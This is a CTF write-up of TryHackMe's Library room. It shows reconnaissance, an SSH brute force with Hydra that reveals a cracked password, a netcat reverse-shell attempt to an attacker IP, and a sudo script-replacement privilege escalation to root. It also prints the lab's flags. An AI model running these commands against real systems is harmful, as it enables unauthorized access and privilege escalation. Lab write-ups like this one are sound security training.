---
title: "Library CTF - TryHackMe"
author: Ludovic COULON
date: 2020-06-11
hero: ./images/hero.jpeg
excerpt: "Writeup for the Library CTF room on TryHackMe"
---

[TryHackMe | Library CTF](https://tryhackme.com/room/bsidesgtlibrary)

Read user.txt and root.txt

---

### Setup

```bash
➜  TryHackMe nmap -A -vv 10.10.98.89
```

```bash
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/X/Zd2/Rc7PrxR+K9bGX9i7Imk3JlU274UsMqM6X03THehc6XUvg0URMryl9IldYLjQvD0fadIg1jB8rCxqzRiJi35nw7ICUXnpZryDS/guLb94Sb9IrLWBTNNdUWV7bTb4gMaGHdyQAmKY62FgL2aKUFMn8SpxJu0WiVIQgcKkv15s17rNqVD39kG8x/bfdftcjn/YtEP09Sy4z1FqXF9FT1xWKaVr3Pd5rCAU4rpOzVpS+qTj77NWaXNDlcg3aCRaILD+4lquq8kVAA+VcXR9IwXOTKJRzRCMfYwd3M6QC45LlRa17xvhI++vBtCcGwxuD9JZsXu0Cd/5fdisrl
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI8Oi4FyiWylek0a1n1TD1/TBOi2uXVPfqoSo1C56D1rJlv4g2g6SDJjW29bhodoVO6W8VdWNQGiyJ5QW2XirHI=
|   256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOPQQrT4KT/PF+8i33LGgs0c83MQL1m863niSGsBDfCN

80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<div className="Image__Medium">
  <img src="https://imgur.com/NWlX0nd.png" alt="blog_image" />
</div>

Let's see if there is some hidden directory 😔

```bash
➜  ~ dirb http://10.10.98.89/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Jun  9 16:57:31 2020
URL_BASE: http://10.10.98.89/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.98.89/ ----
==> DIRECTORY: http://10.10.98.89/images/
+ http://10.10.98.89/index.html (CODE:200|SIZE:5439)
+ http://10.10.98.89/robots.txt (CODE:200|SIZE:33)
+ http://10.10.98.89/server-status (CODE:403|SIZE:299)
```

<div className="Image__Medium">
  <img src="https://imgur.com/R4JWXDR.png" alt="blog_image" />
</div>

<div className="Image__Small">
  <img src="https://imgur.com/oY8Ps8x.png" alt="blog_image" />
</div>

"Posted by meliodas" maybe a username ? let's keep it..

There is nothing on the website, this is a simple landing page with HTML nothing to attack there, but there is something interresting on the "robots.txt" the "User-agent: Rockyou".

Let's try to crack the ssh password with Hydra 🥰

```bash
# Meliodas was the name that we found on the index.html and rockyou is a list of common password
➜  TryHackMe hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.98.89
```

<div className="Image__Medium">
  <img src="https://imgur.com/ZMBdybW.png" alt="blog_image" />
</div>

```bash
[22][ssh] host: 10.10.98.89   login: meliodas   password: iloveyou1
```

### #1 user.txt

<div className="Image__Medium">
  <img src="https://imgur.com/i4x8ElV.png" alt="blog_image" />
</div>

```bash
meliodas@ubuntu:~$ cat user.txt
6d488cbb3f111d135722c33cb635f4ec
```

### #2 root.txt

```bash
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

```bash
meliodas@ubuntu:~$ cat bak.py
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

Ok now, we know that we can execute a python script with the root privileges let's try to have a root shell and run it with sudo 🤓

```bash
meliodas@ubuntu:~$ echo 'nc -e /bin/sh 10.9.2.228 4444' > bak.py
-bash: bak.py: Permission denied
```

Well.. That doesn't work let's try something else..

On the sudo -l command we can see the path of the file "/home/meliodas/bak.py"

Let's delete it and recreate our own one 🤑

```bash
meliodas@ubuntu:~$ rm -rf /home/meliodas/bak.py
```

```bash
meliodas@ubuntu:~$ echo 'import pty; pty.spawn("/bin/sh")' > /home/meliodas/bak.py
meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cd /root/
$ ls
root.txt
$ cat root.txt
e8c8c6c256c35515d1d344ee0488c617
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/8vldBpt.png" alt="TryhackMeProfile" />
  </a>
</center>
